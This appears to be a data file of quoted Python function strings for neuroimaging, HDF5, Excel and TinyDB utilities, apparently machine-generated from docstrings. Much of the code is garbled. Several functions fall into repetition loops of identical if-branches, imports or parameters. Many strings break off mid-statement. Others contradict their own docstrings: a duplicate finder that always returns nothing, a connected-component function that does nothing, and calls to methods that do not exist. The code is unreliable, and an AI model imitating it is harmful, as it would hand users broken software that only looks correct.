        "def _divmod(a, b, mod):\n    \"\"\"Pixelwise division or divide by a number\"\"\"\n    if mod == 0:\n        return a\n    if mod == 1:\n        return b\n    if mod == 2:\n        return a / b\n    if mod == 3:\n        return a % b\n    if mod == 4:\n        return a // b\n    if mod == 5:\n        return a % b\n    if mod == 6:\n        return a // b\n    if mod == 7:\n        return a % b\n    if mod == 8:\n        return a // b\n    if mod == 9:\n        return a % b\n    if mod == 10:\n        return a // b\n    if mod == 11:\n        return a % b\n    if mod == 12:\n        return a // b\n    if mod == 13:\n        return",
        "def apply_mask(self, mask):\n        \"\"\"Return the image with the given `mask` applied.\"\"\"\n        if self.mode == 'RGBA':\n            return self.convert('RGBA', mask=mask)\n        elif self.mode == 'RGB':\n            return self.convert('RGB', mask=mask)\n        elif self.mode == 'YCbCr':\n            return self.convert('YCbCr', mask=mask)\n        elif self.mode == 'YCbCrA':\n            return self.convert('YCbCrA', mask=mask)\n        elif self.mode == 'Gray':\n            return self.convert('Gray', mask=mask)\n        elif self.mode == 'CMYK':\n            return self.convert('CMYK', mask=mask)\n        elif self.mode == 'CMYKA':\n            return self.convert('CMYK",
        "def binarise(img, mode='reflect'):\n    \"\"\"Return an image with the binarised version of the data of `img`.\"\"\"\n    if mode == 'reflect':\n        img = img.reflect()\n    return img.binarise(mode=mode)",
        "def icc_convertImageToZScores(icc, zscore_file):\n    \"\"\"\n    Return a z-scored version of `icc`.\n    This function is based on GIFT `icatb_convertImageToZScores` function.\n    \"\"\"\n    import scipy.io.wavfile\n    import scipy.io.wavfile.read\n    import scipy.io.wavfile.write\n    import numpy as np\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n    import scipy.io.wavfile\n   ",
        "def _zscore(icc, zscore_threshold):\n    \"\"\"Return the thresholded z-scored `icc`.\"\"\"\n    if zscore_threshold is None:\n        return icc\n    else:\n        return icc / (1 + zscore_threshold)",
        "def write_meta_file(filename, meta_dict):\n    \"\"\"Write the content of the `meta_dict` into `filename`.\n\n    Parameters\n    ----------\n    filename: str\n        Path to the output file\n\n    meta_dict: dict\n        Dictionary with the fields of the metadata .mhd file\n    \"\"\"\n    with open(filename, 'w') as f:\n        f.write(meta_dict)",
        "def write_raw_file(filename, data):\n    \"\"\"Write the data into a raw format file. Big endian is always used.\n\n    Parameters\n    ----------\n    filename: str\n        Path to the output file\n\n    data: numpy.ndarray\n        n-dimensional image data array.\n    \"\"\"\n    with open(filename, 'wb') as f:\n        f.write(struct.pack('<I', len(data)))\n        f.write(data)",
        "def write_data(filename, data, shape=None, meta_dict=None):\n    \"\"\"\n    Write the `data` and `meta_dict` in two files with names\n    that use `filename` as a prefix.\n\n    Parameters\n    ----------\n    filename: str\n        Path to the output file.\n        This is going to be used as a preffix.\n        Two files will be created, one with a '.mhd' extension\n        and another with '.raw'. If `filename` has any of these already\n        they will be taken into account to build the filenames.\n\n    data: numpy.ndarray\n        n-dimensional image data array.\n\n    shape: tuple\n        Tuple describing the shape of `data`\n        Default: data.shape\n\n    meta_dict: dict\n        Dictionary with the fields of the metadata .mhd file\n        Default: {}\n\n",
        "def copy_file(src, dst):\n    \"\"\"Copy .mhd and .raw files to dst.\n\n    If dst is a folder, won't change the file, but if dst is another filepath,\n    will modify the ElementDataFile field in the .mhd to point to the\n    new renamed .raw file.\n\n    Parameters\n    ----------\n    src: str\n        Path to the .mhd file to be copied\n\n    dst: str\n        Path to the destination of the .mhd and .raw files.\n        If a new file name is given, the extension will be ignored.\n\n    Returns\n    -------\n    dst: str\n    \"\"\"\n    if os.path.isdir(dst):\n        return dst\n    if os.path.splitext(dst)[1] == '.mhd':\n        return copy_mhd_file(src, dst)\n",
        "def spss_to_dataframe(input_file):\n    \"\"\"\n    SPSS .sav files to Pandas DataFrame through Rpy2\n\n    :param input_file: string\n\n    :return:\n    \"\"\"\n    import pandas as pd\n    import os\n    import shutil\n    import re\n    import sys\n    import os.path\n    import shutil\n    import subprocess\n    import os.path\n    import os\n    import shutil\n    import tempfile\n    import os.path\n    import os\n    import shutil\n    import subprocess\n    import os\n    import tempfile\n    import os\n    import shutil\n    import subprocess\n    import os\n    import tempfile\n    import os\n    import shutil\n    import subprocess\n    import os\n    import tempfile\n    import os\n    import shutil\n    import subprocess\n    import os\n    import tempfile\n    import os\n    import shutil\n",
        "def sav_to_pandas(input_file):\n    \"\"\"\n    SPSS .sav files to Pandas DataFrame through savreader module\n\n    :param input_file: string\n\n    :return:\n    \"\"\"\n    import pandas as pd\n    import savreader\n    sav_df = savreader.read_sav(input_file)\n    return pd.DataFrame(sav_df)",
        "def save_vars(self, filename, varnames, varlist):\n        \"\"\"\n        Valid extensions '.pyshelf', '.mat', '.hdf5' or '.h5'\n\n        @param filename: string\n\n        @param varnames: list of strings\n        Names of the variables\n\n        @param varlist: list of objects\n        The objects to be saved\n        \"\"\"\n        if filename.endswith('.pyshelf'):\n            self.save_pyshelf(filename, varnames, varlist)\n        elif filename.endswith('.mat'):\n            self.save_mat(filename, varnames, varlist)\n        elif filename.endswith('.hdf5'):\n            self.save_hdf5(filename, varnames, varlist)\n        elif filename.endswith('.h5'):\n            self.save_h5(filename",
        "def create_cli_env(self):\n        \"\"\"Create CLI environment\"\"\"\n        self.env = self.create_env()\n        self.env.create_user_profile()\n        self.env.create_project_profile()\n        self.env.create_project_config()\n        self.env.create_project_config_file()\n        self.env.create_project_config_file_template()\n        self.env.create_project_config_file_template_template()\n        self.env.create_project_config_file_template_template()\n        self.env.create_project_config_file_template_template()\n        self.env.create_project_config_file_template_template()\n        self.env.create_project_config_file_template_template()\n        self.env.create_project_config_file_",
        "def find_all_rois(img):\n    \"\"\"\n    Find all the ROIs in img and returns a similar volume with the ROIs\n    emptied, keeping only their border voxels.\n\n    This is useful for DTI tractography.\n\n    Parameters\n    ----------\n    img: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    Returns\n    -------\n    np.ndarray\n        an array of",
        "def largest_connected_component(volume):\n    \"\"\"\n    Return the largest connected component of a 3D array.\n\n    Parameters\n    -----------\n    volume: numpy.array\n        3D boolean array.\n\n    Returns\n    --------\n    volume: numpy.array\n        3D boolean array with only one connected component.\n    \"\"\"\n    # get the largest connected component\n    volume = volume.copy()\n    volume[volume == 0] = 0\n    return volume",
        "def get_small_connected_components_mask(volume, min_cluster_size):\n    \"\"\"\n    Return as mask for `volume` that includes only areas where\n    the connected components have a size bigger than `min_cluster_size`\n    in number of voxels.\n\n    Parameters\n    -----------\n    volume: numpy.array\n        3D boolean array.\n\n    min_cluster_size: int\n        Minimum size in voxels that the connected component must have.\n\n    Returns\n    --------\n    volume: numpy.array\n        3D int array with a mask excluding small connected components.\n    \"\"\"\n    # get the number of voxels in the volume\n    volume_n = volume.shape[0]\n\n    # get the number of voxels in the connected components\n    connected_components_n = volume.shape[1]\n\n    # get the number of",
        "def get_mask_from_rois(roislist, filelist):\n    \"\"\"\n    Look for the files in filelist containing the names in roislist, these files will be opened, binarised\n    and merged in one mask.\n\n    Parameters\n    ----------\n    roislist: list of strings\n        Names of the ROIs, which will have to be in the names of the files in filelist.\n\n    filelist: list of strings\n        List of paths to the volume files containing the ROIs.\n\n    Returns\n    -------\n    numpy.ndarray\n        Mask volume\n    \"\"\"\n    mask = np.zeros((len(filelist), len(roislist)))\n    for i in range(len(filelist)):\n        mask[i, :] = np.load(filelist[i])\n    return mask",
        "def unique_values(arr):\n    \"\"\"Return a sorted list of the non-zero unique values of arr.\n\n    Parameters\n    ----------\n    arr: numpy.ndarray\n        The data array\n\n    Returns\n    -------\n    list of items of arr.\n    \"\"\"\n    return sorted(set(arr), key=lambda x: x)",
        "def get_center_of_mass_for_all_rois(vol):\n    \"\"\"Get the center of mass for each ROI in the given volume.\n\n    Parameters\n    ----------\n    vol: numpy ndarray\n        Volume with different values for each ROI.\n\n    Returns\n    -------\n    OrderedDict\n        Each entry in the dict has the ROI value as key and the center_of_mass coordinate as value.\n    \"\"\"\n    center_of_mass = OrderedDict()\n    for roi in vol.shape[1]:\n        center_of_mass[roi] = np.mean(vol[:, :, roi])\n    return center_of_mass",
        "def extract_roi_values(datavol, roivol, roivalue, maskvol, zeroe=False):\n    \"\"\"\n    Extracts the values in `datavol` that are in the ROI with value `roivalue` in `roivol`.\n    The ROI can be masked by `maskvol`.\n\n    Parameters\n    ----------\n    datavol: numpy.ndarray\n        4D timeseries volume or a 3D volume to be partitioned\n\n    roivol: numpy.ndarray\n        3D ROIs volume\n\n    roivalue: int or float\n        A value from roivol that represents the ROI to be used for extraction.\n\n    maskvol: numpy.ndarray\n        3D mask volume\n\n    zeroe: bool\n        If true will remove the null timeseries voxels.  Only applied to timeseries (4D) data.\n\n    Returns",
        "def pick_vol(image, vol_idx):\n    \"\"\"Pick one 3D volume from a 4D nifti image file\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Volume defining different ROIs.\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    vol_idx: int\n        Index of the 3D volume to be extracted from the 4D volume.\n\n    Returns\n    -------\n    vol, hdr,",
        "def get_dataset(self, ds_name):\n        \"\"\"\n        Returns a h5py dataset given its registered name.\n\n        :param ds_name: string\n        Name of the dataset to be returned.\n\n        :return:\n        \"\"\"\n        if ds_name not in self.datasets:\n            raise ValueError(\"Dataset '{}' is not registered\".format(ds_name))\n        return self.datasets[ds_name]",
        "def create_dataset(self, ds_name, dtype=None):\n        \"\"\"\n        Creates a Dataset with unknown size.\n        Resize it before using.\n\n        :param ds_name: string\n\n        :param dtype: dtype\n        Datatype of the dataset\n\n        :return: h5py DataSet\n        \"\"\"\n        ds = self.create_dataset_h5(ds_name, dtype=dtype)\n        ds.resize(None)\n        return ds",
        "def save_data(self, ds_name, data, dtype=None):\n        \"\"\"\n        Saves a Numpy array in a dataset in the HDF file, registers it as\n        ds_name and returns the h5py dataset.\n\n        :param ds_name: string\n        Registration name of the dataset to be registered.\n\n        :param data: Numpy ndarray\n\n        :param dtype: dtype\n        Datatype of the dataset\n\n        :return: h5py dataset\n        \"\"\"\n        if not isinstance(data, np.ndarray):\n            raise ValueError('data must be a Numpy ndarray')\n        if not isinstance(dtype, np.dtype):\n            raise ValueError('dtype must be a Numpy dtype')\n        if not isinstance(ds_name, str):\n            raise ValueError('ds_name must be a string')\n        if not isinstance(data.dtype, dtype):\n",
        "def create_dataset(self, dataset_name, dataset_type, dataset_params,\n                       dataset_params_dict=None, dataset_params_dict_copy=None,\n                       dataset_params_dict_copy_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params_dict_overwrite_overwrite=False,\n                       dataset_params",
        "def get_range_values(self, df, range_values, fill_value=0, fill_method=None):\n        \"\"\"\n        Will get the names of the index colums of df, obtain their ranges from\n        range_values dict and return a reindexed version of df with the given\n        range values.\n\n        :param df: pandas DataFrame\n\n        :param range_values: dict or array-like\n        Must contain for each index column of df an entry with all the values\n        within the range of the column.\n\n        :param fill_value: scalar or 'nearest', default 0\n        Value to use for missing values. Defaults to 0, but can be any\n        \"compatible\" value, e.g., NaN.\n        The 'nearest' mode will fill the missing value with the nearest value in\n         the column.\n\n        :param fill_method:  {'",
        "def get(self, key):\n        \"\"\"\n        Retrieve pandas object or group of Numpy ndarrays\n        stored in file\n\n        Parameters\n        ----------\n        key : object\n\n        Returns\n        -------\n        obj : type of object stored in file\n        \"\"\"\n        if isinstance(key, (list, tuple)):\n            return self.get_all(key)\n        else:\n            return self.get_one(key)",
        "def store(self, key, value, format='fixed', append=False, encoding=None):\n        \"\"\"\n        Store object in HDFStore\n\n        Parameters\n        ----------\n        key : str\n\n        value : {Series, DataFrame, Panel, Numpy ndarray}\n\n        format : 'fixed(f)|table(t)', default is 'fixed'\n            fixed(f) : Fixed format\n                Fast writing/reading. Not-appendable, nor searchable\n\n            table(t) : Table format\n                Write as a PyTables Table structure which may perform worse but allow more flexible operations\n                like searching/selecting subsets of the data\n\n        append : boolean, default False\n            This will force Table format, append the input data to the\n            existing.\n\n        encoding : default None, provide an encoding for strings\n        \"\"\"\n        if format == 'fixed':\n            self._",
        "def to_hdf(self, key, df, range_values=None, loop_multiindex=False, unstack=True,\n               fill_value=0, fill_method=None, fill_method_kwargs=None,\n               fill_value_kwargs=None, fill_method_kwargs_dict=None,\n               fill_method_kwargs_list=None, fill_method_kwargs_dict_list=None,\n               fill_method_kwargs_list_list=None, fill_method_kwargs_list_list=None,\n               fill_method_kwargs_list_list_list=None, fill_method_kwargs_list_list_list=None,\n               fill_method_kwargs_list_list_list_list=None, fill_method_kwargs_list_list_list=None,\n               fill_method_kwargs_list_list_list_list",
        "def set_smoothing_kernel(self, mm):\n        \"\"\"Set a smoothing Gaussian kernel given its FWHM in mm.\"\"\"\n        self.smoothing_kernel = GaussianKernel(mm, self.kernel_size)",
        "def get_masked_data(self, mask_img):\n        \"\"\"\n        First set_mask and the get_masked_data.\n\n        Parameters\n        ----------\n        mask_img:  nifti-like image, NeuroImage or str\n            3D mask array: True where a voxel should be used.\n            Can either be:\n            - a file path to a Nifti image\n            - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n            If niimg is a string, consider it as a path to Nifti image and\n            call nibabel.load on it. If it is an object, check if get_data()\n            and get_affine() methods are present, raise TypeError otherwise.\n\n        Returns\n        -------\n        The masked data deepcopied\n        \"\"\"\n       ",
        "def set_mask(self, mask_img):\n        \"\"\"\n        Sets a mask img to this. So every operation to self, this mask will be taken into account.\n\n        Parameters\n        ----------\n        mask_img: nifti-like image, NeuroImage or str\n            3D mask array: True where a voxel should be used.\n            Can either be:\n            - a file path to a Nifti image\n            - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n            If niimg is a string, consider it as a path to Nifti image and\n            call nibabel.load on it. If it is an object, check if get_data()\n            and get_affine() methods are present, raise TypeError otherwise.\n\n        Note\n        ----\n        self.img and mask",
        "def _get_masked_data(self, data):\n        \"\"\"Return the data masked with self.mask\n\n        Parameters\n        ----------\n        data: np.ndarray\n\n        Returns\n        -------\n        masked np.ndarray\n\n        Raises\n        ------\n        ValueError if the data and mask dimensions are not compatible.\n        Other exceptions related to numpy computations.\n        \"\"\"\n        if self.mask is None:\n            return data\n        else:\n            return np.ma.masked_invalid(data, self.mask)",
        "def smooth(self):\n        \"\"\"\n        Set self._smooth_fwhm and then smooths the data.\n        See boyle.nifti.smooth.smooth_imgs.\n\n        Returns\n        -------\n        the smoothed data deepcopied.\n        \"\"\"\n        if self._smooth_fwhm is None:\n            self._smooth_fwhm = smooth_imgs(self.data, self.fwhm, self.smooth_mode)\n        return self._smooth_fwhm",
        "def get_mask(self):\n        \"\"\"Return a vector of the masked data.\n\n        Returns\n        -------\n        np.ndarray, tuple of indices (np.ndarray), tuple of the mask shape\n        \"\"\"\n        if self.mask is None:\n            return None, None, None\n        else:\n            return self.mask.reshape(self.shape)",
        "def save(self, outpath):\n        \"\"\"Save this object instance in outpath.\n\n        Parameters\n        ----------\n        outpath: str\n            Output file path\n        \"\"\"\n        with open(outpath, 'wb') as f:\n            pickle.dump(self, f)",
        "def setup_logging(level=None):\n    \"\"\"Setup logging configuration.\"\"\"\n    if level is None:\n        level = logging.INFO\n    logging.basicConfig(\n        format='%(asctime)s %(levelname)s %(message)s',\n        datefmt='%Y-%m-%d %H:%M:%S',\n        level=level)",
        "def extract_volume(filename, vol_idx):\n    \"\"\"Return a 3D volume from a 4D nifti image file\n\n    Parameters\n    ----------\n    filename: str\n        Path to the 4D .mhd file\n\n    vol_idx: int\n        Index of the 3D volume to be extracted from the 4D volume.\n\n    Returns\n    -------\n    vol, hdr\n        The data array and the new 3D image header.\n    \"\"\"\n    hdr = nifti1.read_mhd(filename)\n    vol = hdr['data'][vol_idx]\n    return vol, hdr",
        "def cache(self, nibabel, version=None):\n        \"\"\"A wrapper for mem.cache that flushes the cache if the version\n        number of nibabel has changed.\n        \"\"\"\n        if version is None:\n            version = self.version\n        return mem.cache(self, nibabel, version)",
        "def save_image(h5group, spatial_img, h5path):\n    \"\"\"Saves a Nifti1Image into an HDF5 group.\n\n    Parameters\n    ----------\n    h5group: h5py Group\n        Output HDF5 file path\n\n    spatial_img: nibabel SpatialImage\n        Image to be saved\n\n    h5path: str\n        HDF5 group path where the image data will be saved.\n        Datasets will be created inside the given group path:\n        'data', 'extra', 'affine', the header information will\n        be set as attributes of the 'data' dataset.\n    \"\"\"\n    # Create the HDF5 group\n    h5group.create_group(h5path)\n\n    # Create the data group\n    h5group['data'] = h5py.Group(h5path + '/data')\n\n    #",
        "def save_hdf5(file_path, spatial_img, h5path='/img', append=False):\n    \"\"\"Saves a Nifti1Image into an HDF5 file.\n\n    Parameters\n    ----------\n    file_path: string\n        Output HDF5 file path\n\n    spatial_img: nibabel SpatialImage\n        Image to be saved\n\n    h5path: string\n        HDF5 group path where the image data will be saved.\n        Datasets will be created inside the given group path:\n        'data', 'extra', 'affine', the header information will\n        be set as attributes of the 'data' dataset.\n        Default: '/img'\n\n    append: bool\n        True if you don't want to erase the content of the file\n        if it already exists, False otherwise.\n\n    Note\n    ----\n    HDF5 open modes\n    >>>",
        "def h5attrs_to_dict(h5attrs):\n    \"\"\"\n    Transforms an H5py Attributes set to a dict.\n    Converts unicode string keys into standard strings\n    and each value into a numpy array.\n\n    Parameters\n    ----------\n    h5attrs: H5py Attributes\n\n    Returns\n    --------\n    dict\n    \"\"\"\n    return {k: np.asarray(v) for k, v in h5attrs.items()}",
        "def get_images(h5group):\n    \"\"\"Returns in a list all images found under h5group.\n\n    Parameters\n    ----------\n    h5group: h5py.Group\n        HDF group\n\n    Returns\n    -------\n    list of nifti1Image\n    \"\"\"\n    images = []\n    for key in h5group.keys():\n        if key.startswith('/'):\n            continue\n        if key.startswith('/' + 'images/'):\n            continue\n        if key.startswith('/' + 'images/' + '0/'):\n            continue\n        if key.startswith('/' + 'images/' + '1/'):\n            continue\n        if key.startswith('/' + 'images/' + '2/'):\n            continue\n        if key.startswith('/' + 'images/' + '3/'):\n            continue\n        if",
        "def insert_nifti_files(file_path, h5path, file_list, newshape=None, concat_axis=0, dtype=None, append=False):\n    \"\"\"\n    Inserts all given nifti files from file_list into one dataset in fname.\n    This will not check if the dimensionality of all files match.\n\n    Parameters\n    ----------\n    file_path: string\n        HDF5 file path\n\n    h5path: string\n\n    file_list: list of strings\n\n    newshape: tuple or lambda function\n        If None, it will not reshape the images.\n        If a lambda function, this lambda will receive only the shape array.\n        e.g., newshape = lambda x: (np.prod(x[0:3]), x[3])\n        If a tuple, it will try to reshape all the images with the same",
        "def treefall(iterable):\n    \"\"\"Generate all combinations of the elements of iterable and its subsets.\n\n    Parameters\n    ----------\n    iterable: list, set or dict or any iterable object\n\n    Returns\n    -------\n    A generator of all possible combinations of the iterable.\n\n    Example:\n    -------\n    >>> for i in treefall([1, 2, 3, 4, 5]): print(i)\n    >>> (1, 2, 3)\n    >>> (1, 2)\n    >>> (1, 3)\n    >>> (2, 3)\n    >>> (1,)\n    >>> (2,)\n    >>> (3,)\n    >>> ()\n    \"\"\"\n    if isinstance(iterable, (set, dict)):\n        return itertools.chain.from_iterable(\n            itertools.combinations(iterable, i) for i in range(len(iterable",
        "def list_reliable_dictionaries(application_name, service_name):\n    \"\"\"List existing reliable dictionaries.\n\n    List existing reliable dictionaries and respective schema for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    \"\"\"\n    client = get_client()\n    response = client.list_reliable_dictionaries(application_name, service_name)\n    return response",
        "def query_schema(application_name, service_name, dictionary, output_file=None):\n    \"\"\"Query Schema information for existing reliable dictionaries.\n\n    Query Schema information existing reliable dictionaries for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    :param dictionary: Name of the reliable dictionary.\n    :type dictionary: str\n    :param output_file: Optional file to save the schema.\n    \"\"\"\n    schema_file = os.path.join(\n        os.path.dirname(__file__),\n        'schema.json'\n    )\n    schema = json.load(open(schema_file))\n\n    if application_name not in schema:\n        raise ValueError(\n            'Application \"{}\"",
        "def query_reliable_dictionary(application_name, service_name, dictionary_name, query_string, partition_key=None, partition_id=None,\n                                 output_file=None, output_format=None, output_format_version=None,\n                                 output_format_version_number=None, output_format_version_type=None,\n                                 output_format_version_type_name=None, output_format_version_type_version_number=None,\n                                 output_format_version_type_version_number_type=None, output_format_version_type_version_number_type_name=None,\n                                 output_format_version_type_version_number_type_name=None, output_format_version_type_version_number_type_name=None,\n                                 output_format_version_type_version_number_type",
        "def execute_create_update_delete_operations(application_name, service_name, output_file):\n    \"\"\"Execute create, update, delete operations on existing reliable dictionaries.\n\n    carry out create, update and delete operations on existing reliable dictionaries for given application and service.\n\n    :param application_name: Name of the application.\n    :type application_name: str\n    :param service_name: Name of the service.\n    :type service_name: str\n    :param output_file: input file with list of json to provide the operation information for reliable dictionaries.\n    \"\"\"\n    LOGGER.info(\"Executing create, update and delete operations on existing reliable dictionaries for application '%s' and service '%s'\",\n                 application_name, service_name)\n\n    # Get the existing reliable dictionaries for given application and service.\n    existing_reliable_dictionaries = get_existing_",
        "def _verify_select(self, args):\n        \"\"\"Verify arguments for select command\"\"\"\n        if len(args) < 2:\n            raise CommandError(\"Select command requires at least two arguments\")\n        if args[0] != 'select':\n            raise CommandError(\"Select command requires 'select' as first argument\")\n        if args[1] != 'from':\n            raise CommandError(\"Select command requires 'from' as second argument\")",
        "def get_token(self, token_type, token_value):\n        \"\"\"Get AAD token\"\"\"\n        if token_type == 'client_id':\n            return self.client_id\n        elif token_type == 'client_secret':\n            return self.client_secret\n        elif token_type == 'access_token':\n            return self.access_token\n        elif token_type == 'refresh_token':\n            return self.refresh_token\n        else:\n            raise ValueError('Invalid token type: %s' % token_type)",
        "def read_excel(filename):\n    \"\"\"Use openpyxl to read an Excel file.\"\"\"\n    try:\n        workbook = openpyxl.load_workbook(filename)\n    except IOError:\n        raise IOError(\"Could not open file: %s\" % filename)\n    return workbook",
        "def get_xl_path_module(xl_path):\n    \"\"\"Return the expanded absolute path of `xl_path` if\n    if exists and 'xlrd' or 'openpyxl' depending on\n    which module should be used for the Excel file in `xl_path`.\n\n    Parameters\n    ----------\n    xl_path: str\n        Path to an Excel file\n\n    Returns\n    -------\n    xl_path: str\n        User expanded and absolute path to `xl_path`\n\n    module: str\n        The name of the module you should use to process the\n        Excel file.\n        Choices: 'xlrd', 'pyopenxl'\n\n    Raises\n    ------\n    IOError\n        If the file does not exist\n\n    RuntimError\n        If a suitable reader for xl_path is not found\n    \"\"\"\n    if os.path.exists",
        "def get_workbook(xl_path):\n    \"\"\"Return the workbook from the Excel file in `xl_path`.\"\"\"\n    try:\n        workbook = xlwt.load_workbook(xl_path)\n    except xlwt.error.XLWTError as e:\n        raise IOError(e)\n    return workbook",
        "def get_sheet_names(xl_path):\n    \"\"\"Return a list with the name of the sheets in\n    the Excel file in `xl_path`.\"\"\"\n    sheet_names = []\n    with open(xl_path, 'r') as f:\n        for sheet in f:\n            sheet_names.append(sheet.name)\n    return sheet_names",
        "def get_sheet_df(xl_path, sheetnames=None, add_tab_names=True):\n    \"\"\"\n    Return a pandas DataFrame with the concat'ed\n    content of the `sheetnames` from the Excel file in\n    `xl_path`.\n\n    Parameters\n    ----------\n    xl_path: str\n        Path to the Excel file\n\n    sheetnames: list of str\n        List of existing sheet names of `xl_path`.\n        If None, will use all sheets from `xl_path`.\n\n    add_tab_names: bool\n        If True will add a 'Tab' column which says from which\n        tab the row comes from.\n\n    Returns\n    -------\n    df: pandas.DataFrame\n    \"\"\"\n    if sheetnames is None:\n        sheetnames = get_all_sheets(xl_path)\n\n    df = pd.",
        "def _check_col_names(df, col_names):\n    \"\"\"\n    Raise an AttributeError if `df` does not have a column named as an item of\n    the list of strings `col_names`.\n    \"\"\"\n    if not isinstance(col_names, list):\n        raise AttributeError(\"col_names must be a list\")\n    for col_name in col_names:\n        if col_name not in df.columns:\n            raise AttributeError(\"Column %s does not exist\" % col_name)",
        "def _get_not_null_values(df, col_name):\n    \"\"\"Return a list of not null values from the `col_name` column of `df`.\"\"\"\n    return [v for v in df[col_name].values if v is not None]",
        "def _duplicate_values(df, col_name):\n    \"\"\"\n    Return a DataFrame with the duplicated values of the column `col_name`\n    in `df`.\n    \"\"\"\n    df = df.copy()\n    df[col_name] = df[col_name].copy()\n    return df",
        "def _duplicated_values(values):\n    \"\"\"Return the duplicated items in `values`\"\"\"\n    return [v for v in values if v not in values]",
        "def to_string(data):\n    \"\"\"Convert to string all values in `data`.\n\n    Parameters\n    ----------\n    data: dict[str]->object\n\n    Returns\n    -------\n    string_data: dict[str]->str\n    \"\"\"\n    string_data = {}\n    for key, value in data.items():\n        if isinstance(value, (list, tuple)):\n            string_data[key] = ','.join(map(to_string, value))\n        else:\n            string_data[key] = to_string(value)\n    return string_data",
        "def _unique_search(table, sample):\n    \"\"\"\n    Search for items in `table` that have the same field sub-set values as in `sample`.\n    Expecting it to be unique, otherwise will raise an exception.\n\n    Parameters\n    ----------\n    table: tinydb.table\n    sample: dict\n        Sample data\n\n    Returns\n    -------\n    search_result: tinydb.database.Element\n        Unique item result of the search.\n\n    Raises\n    ------\n    KeyError:\n        If the search returns for more than one entry.\n    \"\"\"\n    # Get the unique values of the fields in the sample\n    unique_values = set(sample.keys())\n\n    # Get the unique values of the fields in the table\n    unique_values = set(table.keys())\n\n    # Check if the unique values are the same\n    if unique_values",
        "def find_unique_id(table, sample, unique_fields=None):\n    \"\"\"\n    Search in `table` an item with the value of the `unique_fields` in the `sample` sample.\n    Check if the the obtained result is unique. If nothing is found will return an empty list,\n    if there is more than one item found, will raise an IndexError.\n\n    Parameters\n    ----------\n    table: tinydb.table\n\n    sample: dict\n        Sample data\n\n    unique_fields: list of str\n        Name of fields (keys) from `data` which are going to be used to build\n        a sample to look for exactly the same values in the database.\n        If None, will use every key in `data`.\n\n    Returns\n    -------\n    eid: int\n        Id of the object found with same `unique_fields`.\n        None if none is",
        "def _create_comparison_query(sample, operators):\n    \"\"\"\n    Create a TinyDB query that looks for items that have each field in `sample` with a value\n    compared with the correspondent operation in `operators`.\n\n    Parameters\n    ----------\n    sample: dict\n        The sample data\n\n    operators: str or list of str\n        A list of comparison operations for each field value in `sample`.\n        If this is a str, will use the same operator for all `sample` fields.\n        If you want different operators for each field, remember to use an OrderedDict for `sample`.\n        Check TinyDB.Query class for possible choices.\n\n    Returns\n    -------\n    query: tinydb.database.Query\n    \"\"\"\n    if isinstance(operators, str):\n        operators = [operators]\n\n    query = tinydb.database.Query()\n    for field,",
        "def _create_query(data, field_names, operators):\n    \"\"\"\n    Create a tinyDB Query object that looks for items that confirms the correspondent operator\n    from `operators` for each `field_names` field values from `data`.\n\n    Parameters\n    ----------\n    data: dict\n        The data sample\n\n    field_names: str or list of str\n        The name of the fields in `data` that will be used for the query.\n\n    operators: str or list of str\n        A list of comparison operations for each field value in `field_names`.\n        If this is a str, will use the same operator for all `field_names`.\n        If you want different operators for each field, remember to use an OrderedDict for `data`.\n        Check TinyDB.Query class for possible choices.\n\n    Returns\n    -------\n    query: tinydb.",
        "def join_queries(queries, operators):\n    \"\"\"\n    Create a tinyDB Query object that is the concatenation of each query in `queries`.\n    The concatenation operator is taken from `operators`.\n\n    Parameters\n    ----------\n    queries: list of tinydb.Query\n        The list of tinydb.Query to be joined.\n\n    operators: str or list of str\n        List of binary operators to join `queries` into one query.\n        Check TinyDB.Query class for possible choices.\n\n    Returns\n    -------\n    query: tinydb.database.Query\n    \"\"\"\n    if not isinstance(queries, list):\n        raise TypeError('queries must be a list of tinyDB.Query objects')\n\n    if not isinstance(operators, list):\n        raise TypeError('operators must be a list of binary operators')\n\n    if len(operators) != len(queries):\n        raise",
        "def get_element(self, table_name, eid):\n        \"\"\"\n        Return the element in `table_name` with Object ID `eid`.\n        If None is found will raise a KeyError exception.\n\n        Parameters\n        ----------\n        table_name: str\n            The name of the table to look in.\n\n        eid: int\n            The Object ID of the element to look for.\n\n        Returns\n        -------\n        elem: tinydb.database.Element\n\n        Raises\n        ------\n        KeyError\n            If the element with ID `eid` is not found.\n        \"\"\"\n        try:\n            return self[table_name][eid]\n        except KeyError:\n            raise KeyError(\"Element %s not found\" % eid)",
